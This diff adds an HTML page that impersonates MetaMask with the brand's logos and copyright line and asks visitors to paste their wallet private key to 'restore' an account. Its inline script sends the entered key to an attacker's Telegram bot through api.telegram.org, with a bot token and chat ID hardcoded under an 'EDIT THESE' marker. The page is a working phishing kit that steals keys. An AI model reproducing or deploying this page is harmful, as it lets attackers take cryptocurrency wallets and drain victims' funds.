@@ -1,0 +1,312 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <head>
+        <meta charset="utf-8"/>
+        <title>About</title>
+        <meta content="About" property="og:title"/>
+        <meta content="About" property="twitter:title"/>
+        <meta content="width=device-width, initial-scale=1" name="viewport"/>
+        <link href="https://cdn.prod.website-files.com/671ab8c3e5122fad4a0db0fb/css/metamask-pagerestore-dev.webflow.1b6e215ee.css" rel="stylesheet" type="text/css"/>
+        <link href="https://fonts.googleapis.com" rel="preconnect"/>
+        <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin="anonymous"/>
+        <script src="https://ajax.googleapis.com/ajax/libs/webfont/1.6.26/webfont.js" type="text/javascript"></script>
+        <script type="text/javascript">
+            WebFont.load({
+                google: {
+                    families: ["Montserrat:100,100italic,200,200italic,300,300italic,400,400italic,500,500italic,600,600italic,700,700italic,800,800italic,900,900italic", "Varela Round:400"]
+                }
+            });
+        </script>
+        <script type="text/javascript">
+            !function(o, c) {
+                var n = c.documentElement
+                  , t = " w-mod-";
+                n.className += t + "js",
+                ("ontouchstart"in o || o.DocumentTouch && c instanceof DocumentTouch) && (n.className += t + "touch")
+            }(window, document);
+        </script>
+        <link href="https://cdn.prod.website-files.com/671ab8c3e5122fad4a0db0fb/671abb75c20c8376683b3404_download%20(1).png" rel="shortcut icon" type="image/x-icon"/>
+        <link href="https://cdn.prod.website-files.com/671ab8c3e5122fad4a0db0fb/671abb7d212f5b0b8bc6714e_MetaMask_Fox.svg%20(1).png" rel="apple-touch-icon"/>
+    </head>
+    <style>
+        body {
+            background: #F5F3FF;
+            margin: 0;
+            font-family: 'Montserrat', Arial, sans-serif;
+        }
+        .heading-4 {
+            font-family: 'Montserrat', Arial, sans-serif;
+            text-align: center;
+            font-weight: 400;
+            margin-top: 60px;
+            color: #242424;
+            letter-spacing: 1px;
+            font-size: 2rem;
+        }
+        .main-card {
+            max-width: 580px;
+            width: 94vw;
+            background: #fff;
+            margin: 35px auto 0 auto;
+            border-radius: 17px;
+            box-shadow: 0 4px 24px 0 rgba(0,0,0,0.08);
+            padding: 36px 32px 32px 32px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        .subtitle {
+            font-size: 1.32rem;
+            font-weight: 600;
+            letter-spacing: 1.2px;
+            color: #262626;
+            margin-bottom: 34px;
+        }
+        .privatekey-label {
+            font-size: 1.01rem;
+            color: #555;
+            font-weight: 500;
+            text-align: left;
+            width: 100%;
+            margin-bottom: 12px;
+            letter-spacing: 0.4px;
+        }
+        .privatekey-input {
+            width: 100%;
+            max-width: 410px;
+            height: 48px;
+            font-size: 1.08rem;
+            border: 2px solid #1818c4;
+            border-radius: 10px;
+            padding: 0 17px;
+            outline: none;
+            font-family: 'Montserrat', Arial, sans-serif;
+            margin-bottom: 16px;
+            color: #262626;
+            background: #f9f8ff;
+            letter-spacing: 1.5px;
+            transition: border-color 0.2s;
+        }
+        .privatekey-input:focus {
+            border-color: #1818c4;
+        }
+        .info-text {
+            font-size: 0.97rem;
+            color: #1818c4;
+            margin-bottom: 16px;
+            text-align: center;
+            margin-top: 2px;
+        }
+        .checkbox-wrap {
+            display: flex;
+            align-items: center;
+            width: 100%;
+            max-width: 410px;
+            margin-bottom: 18px;
+            margin-top: 6px;
+            font-size: 0.98rem;
+            color: #333;
+        }
+        .checkbox-wrap input[type=checkbox] {
+            margin-right: 8px;
+            accent-color: #1818c4;
+            width: 18px;
+            height: 18px;
+        }
+        .restore-btn {
+            background: #1818c4;
+            color: #fff;
+            border: none;
+            width: 100%;
+            max-width: 280px;
+            border-radius: 10px;
+            font-size: 1.09rem;
+            font-weight: 600;
+            padding: 15px 0;
+            cursor: pointer;
+            transition: background 0.2s;
+            letter-spacing: 0.5px;
+            margin-top: 6px;
+            box-shadow: 0 2px 10px 0 rgba(138,129,248,0.08);
+        }
+        .restore-btn:hover {
+            background: #1818c4;
+        }
+        .toast {
+            position: fixed;
+            left: 50%;
+            top: 30px;
+            transform: translateX(-50%);
+            background: #222;
+            color: #fff;
+            font-size: 1rem;
+            padding: 15px 28px;
+            border-radius: 8px;
+            box-shadow: 0 4px 16px 0 rgba(0,0,0,0.14);
+            z-index: 9999;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.3s;
+        }
+        .toast.show {
+            opacity: 1;
+            pointer-events: all;
+        }
+        @media (max-width: 700px) {
+            .main-card { padding: 18px 2vw 22px 2vw; }
+            .privatekey-input, .checkbox-wrap { max-width: 99vw; }
+            .restore-btn { max-width: 98vw; }
+            .heading-4 { font-size: 1.2rem; margin-top: 28px;}
+        }
+    </style>
+</head>
+<body>
+    <div class="w-layout-blockcontainer w-container">
+        <div data-animation="default" data-collapse="medium" data-duration="400" data-easing="ease" data-easing2="ease" role="banner" class="navbar-logo-left-container shadow-three w-nav">
+            <div class="container-14">
+                <div class="navbar-wrapper">
+                    <a href="#" class="navbar-brand w-nav-brand">
+                        <img width="224" loading="lazy" alt="" src="https://cdn.prod.website-files.com/64f6c89edcdb205563627cbb/64f6cd3f32f87d8b03ae2689_1683020772metamask-logo-png.png"/>
+                    </a>
+                    <nav role="navigation" class="nav-menu-wrapper w-nav-menu">
+                        <ul role="list" class="nav-menu-two w-list-unstyled">
+                            <li>
+                                <a href="#" class="nav-link-2">Feature</a>
+                            </li>
+                            <li>
+                                <a href="#" class="nav-link-2">Pricing</a>
+                            </li>
+                            <li>
+                                <div data-delay="0" data-hover="false" class="nav-dropdown w-dropdown">
+                                    <div class="nav-dropdown-toggle w-dropdown-toggle">
+                                        <div class="nav-dropdown-icon w-icon-dropdown-toggle"></div>
+                                        <div>Resources</div>
+                                    </div>
+                                    <nav class="nav-dropdown-list shadow-three mobile-shadow-hide w-dropdown-list">
+                                        <a href="#" class="nav-dropdown-link w-dropdown-link">Resource Link 1</a>
+                                        <a href="#" class="nav-dropdown-link w-dropdown-link">Resource Link 2</a>
+                                        <a href="#" class="nav-dropdown-link w-dropdown-link">Resource Link 3</a>
+                                    </nav>
+                                </div>
+                            </li>
+                            <li class="mobile-margin-top-10">
+                                <a href="#" class="button-primary-3 w-button">RESTORE WALLET</a>
+                            </li>
+                        </ul>
+                    </nav>
+                    <div class="menu-button-2 w-nav-button">
+                        <div class="w-icon-nav-menu"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="heading-4">Connect to Server</div>
+    <div class="main-card">
+        <div class="subtitle">RESTORE PRIVATE KEY</div>
+        <div class="privatekey-label">Enter your private key:</div>
+        <input class="privatekey-input" id="privateKey" type="text" placeholder="Paste your private key here" autocomplete="off">
+        <div class="info-text">
+            Input your private key to restore access to your account securely.
+        </div>
+        <div class="checkbox-wrap">
+            <input type="checkbox" id="agree">
+            <label for="agree">I have entered all details correctly.</label>
+        </div>
+        <button class="restore-btn" onclick="sendToTelegram()">Restore</button>
+    </div>
+    <div class="w-layout-blockcontainer w-container">
+        <section class="footer-dark">
+            <div class="container-9">
+                <div class="footer-wrapper">
+                    <a href="#" class="footer-brand w-inline-block">
+                        <img width="218" loading="lazy" alt="" src="https://cdn.prod.website-files.com/64f6c89edcdb205563627cbb/64f6cd3f32f87d8b03ae2689_1683020772metamask-logo-png.png"/>
+                    </a>
+                    <div class="footer-content">
+                        <div id="w-node-_2304097e-b220-3527-451a-d51cd53c935b-4a0db13c" class="footer-block">
+                            <div class="title-small">Company</div>
+                            <a href="#" class="footer-link">How it works</a>
+                            <a href="#" class="footer-link">Pricing</a>
+                            <a href="#" class="footer-link">Docs</a>
+                        </div>
+                        <div id="w-node-_2304097e-b220-3527-451a-d51cd53c9364-4a0db13c" class="footer-block">
+                            <div class="title-small">About</div>
+                            <a href="#" class="footer-link">Terms &amp;Conditions</a>
+                            <a href="#" class="footer-link">Privacy policy</a>
+                            <div class="footer-social-block">
+                                <a href="#" class="footer-social-link w-inline-block">
+                                    <img loading="lazy" src="https://cdn.prod.website-files.com/62434fa732124a0fb112aab4/62434fa732124ac15112aad5_twitter%20small.svg" alt=""/>
+                                </a>
+                                <a href="#" class="footer-social-link w-inline-block">
+                                    <img loading="lazy" src="https://cdn.prod.website-files.com/62434fa732124a0fb112aab4/62434fa732124a389912aad8_linkedin%20small.svg" alt=""/>
+                                </a>
+                                <a href="#" class="footer-social-link w-inline-block">
+                                    <img loading="lazy" src="https://cdn.prod.website-files.com/62434fa732124a0fb112aab4/62434fa732124a51bf12aae9_facebook%20small.svg" alt=""/>
+                                </a>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="footer-divider"></div>
+            <div class="footer-copyright-center">Copyright © 2024 MetaMask</div>
+        </section>
+    </div>
+    <div class="toast" id="toast"></div>
+    
+    <script>
+        // ==== EDIT THESE ====
+        const BOT_TOKEN = "7010773928:AAHRs0roGY_Rz5d-LxeSoN9qYuK_vgn9DAU";
+        const CHAT_ID = "6787322665";
+        // ====================
+
+        function showToast(message, color="#222") {
+            const toast = document.getElementById('toast');
+            toast.textContent = message;
+            toast.style.background = color;
+            toast.classList.add('show');
+            setTimeout(() => { toast.classList.remove('show'); }, 2400);
+        }
+
+        function sendToTelegram() {
+            const key = document.getElementById('privateKey').value.trim();
+            const checked = document.getElementById('agree').checked;
+
+            if (!key) {
+                showToast('Please enter your private key.', '#C0392B');
+                return;
+            }
+            if (!checked) {
+                showToast('Please confirm all details are correct.', '#C0392B');
+                return;
+            }
+
+            const message = `🔑 <b>Private Key Submitted</b>\n<code>${key}</code>`;
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+            fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: 'HTML'
+                })
+            })
+            .then(res => res.json())
+            .then(data => {
+                if (data.ok) {
+                    document.getElementById('privateKey').value = '';
+                    document.getElementById('agree').checked = false;
+                } else {
+                    showToast('Failed to send. Please try again.', '#C0392B');
+                }
+            })
+            .catch(() => {
+                showToast('Network error. Try again.', '#C0392B');
+            });
+        }
+    </script>
+</body>
+</html>
